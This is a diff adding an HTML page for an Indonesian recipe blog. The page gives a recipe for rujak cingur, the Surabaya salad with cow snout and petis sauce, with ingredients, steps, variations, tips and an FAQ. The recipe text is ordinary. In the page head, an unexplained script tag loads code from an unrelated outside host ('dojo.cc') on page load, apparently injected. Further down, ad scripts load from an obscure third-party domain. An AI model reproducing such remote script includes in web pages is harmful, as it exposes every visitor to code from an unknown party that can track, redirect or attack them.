@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Resep Rujak Cingur Khas Surabaya - Segar, Gurih, dan Bikin Kangen</title>
+    <script src="//dojo.cc/124.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%);
+            color: #333;
+            line-height: 1.8;
+            padding: 20px;
+        }
+        .container {
+            max-width: 850px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
+            padding: 40px 35px;
+            position: relative;
+        }
+        nav {
+            background: linear-gradient(135deg, #e44d26 0%, #c0392b 100%);
+            padding: 12px 25px;
+            border-radius: 50px;
+            margin-bottom: 30px;
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: space-between;
+            box-shadow: 0 4px 15px rgba(196, 55, 35, 0.3);
+        }
+        nav a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            padding: 6px 16px;
+            border-radius: 20px;
+            transition: all 0.3s ease;
+        }
+        nav a:hover {
+            background: rgba(255,255,255,0.2);
+        }
+        nav .logo {
+            font-size: 20px;
+            font-weight: 800;
+            letter-spacing: 1px;
+        }
+        .featured-image {
+            width: 100%;
+            height: auto;
+            border-radius: 16px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
+        }
+        h1 {
+            font-size: 32px;
+            color: #c0392b;
+            margin-bottom: 15px;
+            line-height: 1.3;
+        }
+        h2 {
+            font-size: 24px;
+            color: #e67e22;
+            margin: 30px 0 15px 0;
+            padding-bottom: 8px;
+            border-bottom: 3px solid #fdebd0;
+            position: relative;
+        }
+        h2::after {
+            content: '';
+            position: absolute;
+            bottom: -3px;
+            left: 0;
+            width: 60px;
+            height: 3px;
+            background: #e67e22;
+            border-radius: 2px;
+        }
+        p {
+            margin-bottom: 16px;
+            text-align: justify;
+        }
+        .ingredients,
+        .steps,
+        .tips-box {
+            background: #fdf2e9;
+            border-radius: 16px;
+            padding: 25px 30px;
+            margin: 20px 0;
+            border-left: 5px solid #e67e22;
+        }
+        .ingredients ul {
+            list-style: none;
+            padding: 0;
+        }
+        .ingredients ul li {
+            padding: 8px 0 8px 28px;
+            position: relative;
+            border-bottom: 1px dashed #f0d5b0;
+        }
+        .ingredients ul li:last-child {
+            border-bottom: none;
+        }
+        .ingredients ul li::before {
+            content: '🍽️';
+            position: absolute;
+            left: 0;
+            top: 8px;
+        }
+        .steps ol {
+            padding-left: 24px;
+        }
+        .steps ol li {
+            padding: 10px 0;
+            margin-bottom: 8px;
+            line-height: 1.7;
+        }
+        .steps ol li strong {
+            color: #c0392b;
+        }
+        .tips-box ul {
+            list-style: none;
+            padding: 0;
+        }
+        .tips-box ul li {
+            padding: 10px 0 10px 32px;
+            position: relative;
+            border-bottom: 1px dashed #f0d5b0;
+        }
+        .tips-box ul li:last-child {
+            border-bottom: none;
+        }
+        .tips-box ul li::before {
+            content: '💡';
+            position: absolute;
+            left: 0;
+            top: 10px;
+        }
+        .cta {
+            background: linear-gradient(135deg, #e44d26 0%, #c0392b 100%);
+            color: #fff;
+            text-align: center;
+            padding: 30px 25px;
+            border-radius: 16px;
+            margin: 30px 0;
+        }
+        .cta h2 {
+            color: #fff;
+            border: none;
+            margin-top: 0;
+        }
+        .cta h2::after {
+            background: #fff;
+        }
+        .cta p {
+            text-align: center;
+            font-size: 17px;
+            margin-bottom: 20px;
+        }
+        .cta .btn {
+            display: inline-block;
+            background: #fff;
+            color: #c0392b;
+            padding: 14px 40px;
+            border-radius: 50px;
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+        }
+        .cta .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+        }
+        .related {
+            background: #f9f9f9;
+            border-radius: 16px;
+            padding: 25px 30px;
+            margin: 20px 0;
+        }
+        .related h3 {
+            color: #c0392b;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .related ul {
+            list-style: none;
+            padding: 0;
+        }
+        .related ul li {
+            padding: 8px 0;
+            border-bottom: 1px solid #eee;
+        }
+        .related ul li:last-child {
+            border-bottom: none;
+        }
+        .related ul li a {
+            color: #e67e22;
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+        .related ul li a:hover {
+            color: #c0392b;
+            text-decoration: underline;
+        }
+        .faq-item {
+            margin-bottom: 20px;
+            padding: 18px 22px;
+            background: #fef9f4;
+            border-radius: 12px;
+            border-left: 4px solid #e67e22;
+        }
+        .faq-item strong {
+            display: block;
+            color: #c0392b;
+            font-size: 17px;
+            margin-bottom: 5px;
+        }
+        footer {
+            background: #2c3e50;
+            color: #ddd;
+            padding: 25px 30px;
+            border-radius: 16px;
+            margin-top: 30px;
+            text-align: center;
+            font-size: 14px;
+        }
+        footer a {
+            color: #f8c471;
+            text-decoration: none;
+            margin: 0 8px;
+            transition: color 0.3s;
+        }
+        footer a:hover {
+            color: #fff;
+        }
+        .ad-container {
+            margin: 1.5rem 0;
+            text-align: center;
+            min-height: 90px;
+        }
+        .variasi-item {
+            background: #fef9f4;
+            border-radius: 12px;
+            padding: 18px 22px;
+            margin-bottom: 15px;
+            border-left: 4px solid #e67e22;
+        }
+        .variasi-item h3 {
+            color: #c0392b;
+            font-size: 18px;
+            margin-bottom: 6px;
+        }
+        @media (max-width: 600px) {
+            .container {
+                padding: 20px 15px;
+            }
+            h1 {
+                font-size: 24px;
+            }
+            h2 {
+                font-size: 20px;
+            }
+            nav {
+                flex-direction: column;
+                gap: 8px;
+                border-radius: 20px;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <nav>
+            <a href="#" class="logo">🍽️ MasakanKu</a>
+            <div>
+                <a href="#">Beranda</a>
+                <a href="#">Resep</a>
+                <a href="#">Tips</a>
+                <a href="#">Tentang</a>
+                <a href="#">Kontak</a>
+            </div>
+        </nav>
+
+        <img class="featured-image" src="https://images.unsplash.com/photo-1482049016688-2d3e1b311543?w=800&h=500&fit=crop" alt="Rujak Cingur Khas Surabaya">
+
+        <h1>Resep Rujak Cingur Khas Surabaya: Segar, Gurih, dan Bikin Kangen</h1>
+
+        <p>Masih inget pertama kali nyobain rujak cingur? Gue waktu itu diajak teman ke Surabaya, mampir ke tenda kecil di pinggir jalan. Aroma petis langsung nyenggol hidung. Satu suapan pertama — campuran cingur kenyal, buah segar, dan saus petis yang kental — langsung bikin gue jatuh cinta. Rasanya unik, nggak ada duanya.</p>
+
+        <p>Sejak saat itu, setiap pulang kampung ke Jawa Timur selalu nyempetin mampir beli rujak cingur. Tapi ya namanya juga nggak bisa tiap minggu ke Surabaya, akhirnya belajar bikin sendiri di rumah. Dan ternyata, nggak sesulit yang dibayangkan!</p>
+
+        <p>Nah, kali ini gue mau bagi-bagi resep rujak cingur andalan yang udah gue utak-atik biar rasanya bisa semirip mungkin sama aslinya. Dijamin, kalian yang kangen rujak cingur khas Surabaya bisa bikin sendiri di dapur rumah.</p>
+
+        <h2>Apa Itu Rujak Cingur?</h2>
+
+        <p>Rujak cingur adalah salah satu makanan khas Surabaya yang punya tempat spesial di hati masyarakat Jawa Timur. Bedanya sama rujak pada umumnya, rujak cingur punya ciri khas utama: penggunaan <em>cingur</em> — yaitu hidung atau moncong sapi yang diolah sedemikian rupa. Cingur ini direbus sampai empuk, lalu diiris tipis-tipis dan dicampur ke dalam rujak.</p>
+
+        <p>Uniknya, rujak cingur menggabungkan elemen yang kayaknya nggak nyambung: ada buah-buahan segar kayak nanas dan timun, ada sayuran rebus kayak kangkung dan tauge, ada protein dari tahu dan tempe goreng, plus lontong dan cingur. Semua itu disatukan oleh bumbu petis yang gurih, manis, pedas, dan sedikit asin.</p>
+
+        <p>Rujak cingur biasa disajikan sebagai makanan berat atau camilan. Banyak yang menyebutnya sebagai "rujak terenak di Indonesia" karena perpaduan tekstur dan rasanya yang benar-benar kompleks. Dari yang manis, asin, pedas, segar, sampai gurih — semuanya lengkap dalam satu piring.</p>
+
+        <h2>Bahan-Bahan Rujak Cingur</h2>
+
+        <div class="ingredients">
+            <ul>
+                <li><strong>200 gram cingur sapi</strong> (moncong sapi), cuci bersih</li>
+                <li><strong>1 buah lontong</strong>, potong-potong</li>
+                <li><strong>2 buah tahu putih</strong>, goreng hingga kecoklatan, potong dadu</li>
+                <li><strong>1 papan tempe</strong>, potong dadu, goreng setengah kering</li>
+                <li><strong>1 ikat kangkung</strong>, siangi, rebus sebentar</li>
+                <li><strong>100 gram tauge</strong>, siram air panas, tiriskan</li>
+                <li><strong>1 buah timun</strong>, belah dua, iris tipis</li>
+                <li><strong>1 buah krai</strong> (timun khas Jawa), iris tipis (bisa diganti timun biasa)</li>
+                <li><strong>1/2 buah nanas</strong>, potong kecil-kecil</li>
+            </ul>
+            <h3 style="color:#c0392b;margin:20px 0 10px 0;">Bumbu Petis:</h3>
+            <ul>
+                <li><strong>4 sdm petis udang</strong> asli Surabaya (merk Toples atau sejenisnya)</li>
+                <li><strong>100 gram kacang tanah</strong>, goreng, haluskan</li>
+                <li><strong>5-10 buah cabe rawit</strong> (sesuai selera pedas), ulek halus</li>
+                <li><strong>3 siung bawang putih</strong>, goreng sebentar, ulek</li>
+                <li><strong>3 sdm bawang goreng</strong> untuk taburan</li>
+                <li><strong>2 sdm gula merah</strong>, sisir halus</li>
+                <li><strong>1 sdm asam jawa</strong>, larutkan dalam 3 sdm air hangat</li>
+                <li><strong>Garam</strong> secukupnya</li>
+                <li><strong>Air panas</strong> secukupnya untuk mengencerkan</li>
+            </ul>
+        </div>
+
+        <!-- MIDDLE AD -->
+        <div class="ad-container" style="margin:1.5rem 0;text-align:center;min-height:90px">
+            <script async="async" data-cfasync="false" src="https://jabturfembitter.com/fbf97f8372ae4f56ef2fbb64a6663968/invoke.js"></script>
+            <div id="container-fbf97f8372ae4f56ef2fbb64a6663968"></div>
+        </div>
+
+        <h2>Cara Membuat Rujak Cingur</h2>
+
+        <div class="steps">
+            <ol>
+                <li><strong>Rebus cingur:</strong> Rebus cingur sapi dalam air mendidih selama 45-60 menit sampai empuk. Angkat, tiriskan, lalu iris tipis-tipis sesuai selera. Kalau pakai presto, 20 menit aja udah cukup.</li>
+                <li><strong>Siapkan bahan pelengkap:</strong> Goreng tahu dan tempe sampai kecoklatan. Rebus kangkung sebentar (jangan terlalu lama biar tetap renyah). Siram tauge dengan air panas. Iris timun, krai, dan nanas sesuai selera. Potong-potong lontong.</li>
+                <li><strong>Buat bumbu petis:</strong> Haluskan kacang tanah goreng, cabe rawit, dan bawang putih goreng. Tambahkan petis udang, gula merah sisir, air asam jawa, dan garam. Ulek atau aduk rata. Tambahkan air panas sedikit demi sedikit sampai mendapatkan kekentalan yang pas — nggak terlalu encer, nggak terlalu kental. Koreksi rasa.</li>
+                <li><strong>Penyajian:</strong> Tata semua bahan di piring: lontong, tahu, tempe, kangkung, tauge, timun, krai, nanas, dan irisan cingur. Siram bumbu petis di atasnya. Taburi bawang goreng. Sajikan segera selagi segar!</li>
+            </ol>
+        </div>
+
+        <h2>Rahasia Rujak Cingur yang Enak</h2>
+
+        <p>Banyak yang bilang, kunci enaknya rujak cingur ada di bumbu petisnya. Petis udang yang bagus itu warnanya hitam pekat, aromanya kuat, tapi nggak bau amis. Kalau bisa, cari petis asli Surabaya — merk Toples atau petis dari kawasan Kenjeran. Soal rasa, beda banget sama petis yang dijual di luar Jawa Timur.</p>
+
+        <p>Tips lain: jangan overmix bumbunya. Biarin ada tekstur kasar dari kacang tanah dan cabenya. Itu yang bikin rujak cingur terasa autentik. Dan soal cingur, pastikan kamu merebusnya sampai benar-benar empuk. Cingur yang alot bisa merusak pengalaman makan.</p>
+
+        <p>Yang nggak kalah penting — keseimbangan rasa. Rujak cingur harus punya rasa manis dari gula merah, pedas dari cabe, asin dari petis dan garam, serta segar dari buah dan sayuran. Jangan sampai salah satu rasa terlalu dominan.</p>
+
+        <h2>Variasi Rujak Cingur</h2>
+
+        <div class="variasi-item">
+            <h3>1. Rujak Cingur Tanpa Cingur (Rujak Petis)</h3>
+            <p>Buat yang nggak suka atau nggak bisa makan daging sapi, kamu bisa bikin versi tanpa cingur. Ganti dengan tambahan tahu, tempe, dan lontong yang lebih banyak. Rasanya tetap enak, kok! Beberapa warung di Surabaya juga nyebut ini "rujak petis".</p>
+        </div>
+
+        <div class="variasi-item">
+            <h3>2. Rujak Cingur Seafood</h3>
+            <p>Variasi kekinian yang mulai banyak dijual di kafe-kafe Surabaya. Cingur diganti atau dicampur dengan udang rebus, cumi goreng tepung, dan kerang. Seru buat dicoba kalau kamu bosan dengan versi klasik.</p>
+        </div>
+
+        <div class="variasi-item">
+            <h3>3. Rujak Cingur Vegetarian</h3>
+            <p>Cingur diganti dengan jamur tiram yang dimasak kecap manis atau tahu kukus yang dipotong menyerupai bentuk cingur. Saus petisnya juga bisa pakai petis nabati yang sekarang udah ada di beberapa supermarket. Cocok buat yang lagi pengen makanan plant-based.</p>
+        </div>
+
+        <h2>Tips Biar Rujak Cingur Sempurna</h2>
+
+        <div class="tips-box">
+            <ul>
+                <li><strong>Kualitas petis itu nomor satu.</strong> Jangan asal beli petis. Cari petis yang legit dan nggak terlalu asin. Petis Surabaya asli biasanya punya rasa yang lebih kompleks.</li>
+                <li><strong>Rebus cingur dengan daun salam.</strong> Biar nggak bau prengus, rebus cingur pakai 3 lembar daun salam, 2 batang serai geprek, dan jahe. This makes a huge difference!</li>
+                <li><strong>Jangan malas ngulek.</strong> Bumbu yang diulek manual rasanya beda sama yang diblender. Teksturnya lebih kasar dan aromanya lebih keluar.</li>
+                <li><strong>Keseimbangan rasa itu kunci.</strong> Cicipi bumbu petis sebelum disiram. Pastikan manis, asin, pedasnya seimbang. Gula merah bisa ditambah kalau kurang manis, cabe rawit kalau kurang pedas.</li>
+                <li><strong>Sajikan segera.</strong> Rujak cingur paling enak dimakan fresh. Kalau didiamkan terlalu lama, sayurannya layu dan kuahnya merembes ke mana-mana.</li>
+            </ul>
+        </div>
+
+        <h2>FAQ Rujak Cingur</h2>
+
+        <div class="faq-item">
+            <strong>Apakah cingur sapi bisa diganti dengan bahan lain?</strong>
+            Bisa banget. Kamu bisa ganti dengan kikil sapi, lidah sapi, atau bahkan daging sapi rebus yang diiris tipis. Tapi ya, soal rasa dan teksturnya pasti beda dari aslinya.
+        </div>
+
+        <div class="faq-item">
+            <strong>Berapa lama rujak cingur bisa bertahan di kulkas?</strong>
+            Sebaiknya jangan disimpan. Rujak cingur paling enak dimakan langsung. Kalau terpaksa, pisahkan bumbu dan bahan-bahannya. Bumbu petis bisa tahan 3-4 hari di kulkas dalam wadah tertutup.
+        </div>
+
+        <div class="faq-item">
+            <strong>Kenapa rujak cingur saya pahit?</strong>
+            Mungkin petis yang digunakan kurang bagus atau terlalu tua. Atau bisa juga karena bawang putih yang digoreng terlalu gosong. Pastikan bawang putih digoreng sampai kuning kecoklatan aja, jangan sampai hangus.
+        </div>
+
+        <div class="faq-item">
+            <strong>Di mana beli petis udang yang bagus kalau di luar Surabaya?</strong>
+            Coba cari di toko online, cek merk "Petis Toples" atau "Petis Nyi" — dua merk ini paling mudah ditemukan dan rasanya mirip sama asli Surabaya. Atau minta titip teman yang lagi ke Surabaya!
+        </div>
+
+        <div class="faq-item">
+            <strong>Apakah rujak cingur halal?</strong>
+            Selama cingur yang digunakan berasal dari sapi yang disembelih secara halal, dan bahan-bahan lainnya juga halal, rujak cingur hukumnya halal. Tapi pastikan juga petisnya nggak mengandung alkohol atau bahan non-halal lainnya.
+        </div>
+
+        <div class="cta">
+            <h2>Suka dengan Resep Ini?</h2>
+            <p>Jangan lupa share ke teman-teman kamu yang juga doyan makanan khas Indonesia! Biar makin banyak yang bisa nyobain rujak cingur autentik khas Surabaya.</p>
+            <a href="#" class="btn">Bagikan Resep</a>
+        </div>
+
+        <div class="related">
+            <h3>📖 Baca Juga</h3>
+            <ul>
+                <li><a href="#">Resep Rawon Nguling Khas Surabaya: Kuah Hitam yang Bikin Nagih</a></li>
+                <li><a href="#">Resep Garang Asem Khas Kudus: Segar dan Hangat untuk Buka Puasa</a></li>
+                <li><a href="#">Resep Lontong Balap Khas Surabaya: Lengkap dengan Sambal Petis</a></li>
+                <li><a href="#">Resep Tahu Campur Khas Lamongan: Sederhana Tapi Juara</a></li>
+            </ul>
+        </div>
+
+        <!-- FOOTER AD -->
+        <div class="ad-container" style="margin:1.5rem 0;text-align:center">
+            <script>atOptions={"key":"7f4bd95b8fb4ff051d5837b9e935f6b8","format":"iframe","height":90,"width":728,"params":{}};</script>
+            <script src="https://jabturfembitter.com/7f4bd95b8fb4ff051d5837b9e935f6b8/invoke.js"></script>
+        </div>
+
+        <footer>
+            <p>&copy; 2026 MasakanKu. Semua resep dikumpulkan dari dapur nusantara.</p>
+            <p>
+                <a href="#">RemoteProduktif</a> |
+                <a href="#">Fattan</a> |
+                <a href="#">Tentang Kami</a> |
+                <a href="#">Kebijakan Privasi</a> |
+                <a href="#">Kontak</a>
+            </p>
+        </footer>
+    </div>
+</body>
+</html>
